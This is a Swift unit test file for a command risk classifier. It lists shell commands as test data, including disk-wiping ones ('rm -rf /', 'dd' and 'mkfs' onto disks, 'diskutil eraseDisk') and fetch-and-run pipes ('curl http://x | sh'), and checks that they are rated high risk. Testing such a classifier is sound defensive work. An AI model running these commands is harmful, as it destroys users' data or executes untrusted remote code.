import XCTest
@testable import ToolKeeper

final class RiskClassifierTests: XCTestCase {

    // MARK: - High Risk

    func testHighRiskCommands() {
        let highRiskCommands: [(String, String)] = [
            ("rm -rf /", "rm -rf slash"),
            ("sudo rm -rf /", "sudo rm -rf slash"),
            ("curl http://x | sh", "curl pipe to sh"),
            ("wget http://x | sh", "wget pipe to sh"),
            ("dd if=/dev/zero of=/dev/disk0", "dd overwrite disk"),
            ("mkfs.ext4 /dev/sda", "mkfs format disk"),
            ("diskutil eraseDisk", "diskutil eraseDisk"),
            ("launchctl unload /Library/LaunchDaemons/x", "launchctl unload"),
            ("launchctl bootout system/x", "launchctl bootout"),
        ]

        for (command, description) in highRiskCommands {
            let result = RiskClassifier.classify(command: command)
            XCTAssertEqual(result, .high, "Expected .high for '\(command)' (\(description))")
        }
    }

    // MARK: - Medium Risk

    func testMediumRiskCommands() {
        let mediumRiskCommands: [(String, String)] = [
            ("chmod -R 777 /", "chmod recursive 777"),
            ("chown -R root /", "chown recursive root"),
            ("brew install wget", "brew install"),
            ("npm install -g typescript", "npm global install"),
            ("pip install requests", "pip install"),
            ("eval $(some_command)", "eval substitution"),
        ]

        for (command, description) in mediumRiskCommands {
            let result = RiskClassifier.classify(command: command)
            XCTAssertEqual(result, .medium, "Expected .medium for '\(command)' (\(description))")
        }
    }

    // MARK: - Low Risk

    func testLowRiskCommands() {
        let lowRiskCommands: [(String, String)] = [
            ("ls -la", "ls with flags"),
            ("echo hello", "echo simple"),
            ("cat file.txt", "cat file"),
            ("git status", "git status"),
        ]

        for (command, description) in lowRiskCommands {
            let result = RiskClassifier.classify(command: command)
            XCTAssertEqual(result, .low, "Expected .low for '\(command)' (\(description))")
        }
    }

    // MARK: - Case Insensitivity

    func testCaseInsensitivity() {
        XCTAssertEqual(
            RiskClassifier.classify(command: "RM -RF /"),
            .high,
            "Expected .high for uppercase 'RM -RF /'"
        )
        XCTAssertEqual(
            RiskClassifier.classify(command: "Sudo ls"),
            .high,
            "Expected .high for mixed-case 'Sudo ls'"
        )
    }
}
